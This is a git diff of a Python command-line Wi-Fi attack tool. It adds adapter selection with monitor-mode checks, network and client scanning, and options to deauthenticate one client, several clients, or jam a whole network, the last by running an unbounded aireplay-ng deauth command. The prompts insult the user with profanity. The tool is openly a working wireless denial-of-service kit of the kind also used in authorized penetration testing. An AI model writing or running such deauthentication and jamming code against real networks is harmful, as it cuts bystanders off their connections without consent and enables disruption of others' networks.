@@ -10,12 +10,19 @@ try:
     import sys
 except ModuleNotFoundError:
     print("Try installing the dependencies")
+    print("Also install the Aircrack-ng suite on your sistem")
+
+from wifi import WiFi
 
 console = Console()
+wifi_scanner = None
 back = False
 wifi = False
 bluetooth = False
 sysinfo = False
+ap_mac = None
+client_mac = None
+clients = []
 
 def printLogo2():
     print(Fore.RED + """
@@ -140,50 +147,186 @@ def handleBluetooth():
             back = True
             bluetooth = False
             os.system("clear")
+
+def is_monitor_mode(interface):
     
+        try:
+            # Run iwconfig and capture the output
+            result = subprocess.check_output(f"iwconfig {interface}", shell=True, stderr=subprocess.DEVNULL)
+            output = result.decode()
+
+            # Check if 'Mode:Monitor' is in the output
+            if "Mode:Monitor" in output:
+                return True
+            else:
+                return False
+        except subprocess.CalledProcessError:
+            return False
+        
+def list_and_choose_network():
+        table = Table(title="Available adapters")
+        table.add_column("Index", justify="center", style="yellow")
+        table.add_column("Adapter name", justify="left", style="green")
+        table.add_column("Adapter mode", justify="left", style="magenta")
+
+        adapters = psutil.net_if_addrs()
+        adapter_list = []
+
+        for i, adapter_name in enumerate(adapters.keys()):
+            adapter_list.append(adapter_name)
+            if is_monitor_mode(adapter_name):
+                table.add_row(str(i), adapter_name, "Monitor mode")
+            else:
+                table.add_row(str(i), adapter_name, "Managed")
+        console.print(table)
+
+        repeat = True
+
+        while repeat:
+            choice = input((Fore.GREEN + "\n> " + Fore.RESET))
+            if choice.lower() == "q":
+                break
+            try:
+                index = int(choice)
+                if 0 <= index < len(adapter_list):
+                    repeat = False
+                    return adapter_list[index]
+                else:
+                    print("\nLearn to read Moron!!")
+            except ValueError:
+                print("\nLearn to read Moron!!")
+
 def handleWiFi():
-    global wifi, back
+    global wifi, back, wifi_scanner, ap_mac, client_mac, clients
 
     os.system("clear")
     
     wifi = True
     back = False
+    
 
     wtable = Table(title= "[bold red] Wifi Menu [/bold red]")
     wtable.add_column("Nr.")
     wtable.add_column("Option")
 
     wtable.add_row("0", "Show available networks adapters")
-    wtable.add_row("1", "Scan for clients")
-    wtable.add_row("2", "Deauth client")
-    wtable.add_row("3", "Deauth clients")
-    wtable.add_row("4", "Jammer (will block the entire network)")
-    wtable.add_row("5", "Back")
+    wtable.add_row("1", "Scan and choose network")
+    wtable.add_row("2", "Scan for clients")
+    wtable.add_row("3", "Deauth client")
+    wtable.add_row("4", "Deauth clients")
+    wtable.add_row("5", "Jammer (will block the entire network)")
+    wtable.add_row("6", "Back")
 
     while wifi and not back:
         printWIFILogo()
+
         console.print(wtable)
 
-        option = int(input(Fore.GREEN + "> " + Fore.RESET))
+        try:
+            option = int(input(Fore.GREEN + "> " + Fore.RESET))
+        except ValueError:
+            print(Fore.RED + "Please enter a number." + Fore.RESET)
+            continue
 
-        if option >= 0 and option <= 5:
+        if option >= 0 and option <= 6:
             if option == 0:
-                print("Show available networks adapters")
+
+                adapter = list_and_choose_network()
+                wifi_scanner = WiFi(adapter, console)
+
             if option == 1:
-                print("Scan for clients")
+                if wifi_scanner is None:
+                   print(Fore.RED + "You need to select an adapter first (option 0)." + Fore.RESET)
+                   console.print(wtable)
+                else: 
+                
+                    result = wifi_scanner.scan_networks()
+                    if result and all(value is not None for value in result):
+                        id, ssid, ap_mac, channel, dbm_signal, security = result
+                        print(f"\nDetails for network: {id}")
+                        print(f"SSID: {ssid}")
+                        print(f"BSSID: {ap_mac}")
+                        print(f"Channel: {channel}")
+                        print(f"Signal: {dbm_signal}")
+                        print(f"Security: {security}")
+
             if option == 2:
-                print("Deauth client")
+
+                if wifi_scanner is None or ap_mac is None: 
+                   print(Fore.RED + "You need to select an adapter first (option 0). \nScan for a network second!" + Fore.RESET)
+                   console.print(wtable)
+                else: 
+                    
+                    client_result = wifi_scanner.client_scan(ap_mac)
+                    if client_result is None:
+                        print("\nNo client selected")
+                    else:
+                        client_mac = client_result
+                        clients.append(client_mac)
+
             if option == 3:
-                print("Deauth clients")
+
+                if wifi_scanner is None:
+                   print(Fore.RED + "You need to select an adapter first (option 0)." + Fore.RESET)
+                   console.print(wtable)
+                else:
+                    if client_mac:
+                        wifi_scanner.deauth_client(gateway_mac= ap_mac, target_mac= client_mac)
+                    else:
+                        print(Fore.RED + "No client selected yet. Scan and select a client first." + Fore.RESET)
+
             if option == 4:
-                print("Jammer (will block the entire network)")
+
+                if wifi_scanner is None:
+                   print(Fore.RED + "You need to select an adapter first (option 0)." + Fore.RESET)
+                   console.print(wtable)
+                else: 
+                    c_mac = 0
+                    repeat = True
+
+                    while repeat:
+                        choice = input("Do you want to add another client? (y/n) ")
+                        if choice.lower() == "n":
+                            repeat = False
+                        else:
+                            c_result = wifi_scanner.client_scan(ap_mac)
+                            if c_result is None:
+                                print("\nNo client selected")
+                                repeat = False
+                            else:
+                                c_mac = c_result
+                                clients.append(c_mac)
+
+                    for client in clients:
+                        wifi_scanner.deauth_client(gateway_mac= ap_mac, target_mac= client)
+
+
             if option == 5:
+
+                if wifi_scanner is None:
+                   print(Fore.RED + "You need to select an adapter first (option 0)." + Fore.RESET)
+                   console.print(wtable)
+                else:
+                    command = f"sudo aireplay-ng --deauth 0 -a {ap_mac} {adapter}" 
+                    try:
+                        subprocess.run(command, shell=True, check=True)
+                    except subprocess.CalledProcessError as e:
+                        print(f"[!] Error executing command: {e}")
+
+            if option == 6:
+
+                if wifi_scanner is not None:
+                    wifi_scanner.clear_wifi_data()
+                else:
+                    print(Fore.YELLOW + "[!] No adapter initialized. Nothing to clear." + Fore.RESET)
+
+                clients.clear()
                 back = True
                 wifi = False
                 os.system("clear")
         else:
             print()
-            print(Fore.RED + "Your fucking moron. Can't u read?? Choose a option between 0 and 4 !!" + Fore.RESET)
+            print(Fore.RED + "Your fucking moron. Can't u read?? Choose a option between 0 and 6 !!" + Fore.RESET)
 
 def check_sudo():
     if os.geteuid() != 0:
@@ -246,4 +389,4 @@ if __name__ == "__main__":
         main()
     except KeyboardInterrupt:
         print()
-        print(Fore.YELLOW + "[+] Program closed bu user" + Fore.RESET)
+        print(Fore.YELLOW + "[+] Program closed by user" + Fore.RESET)
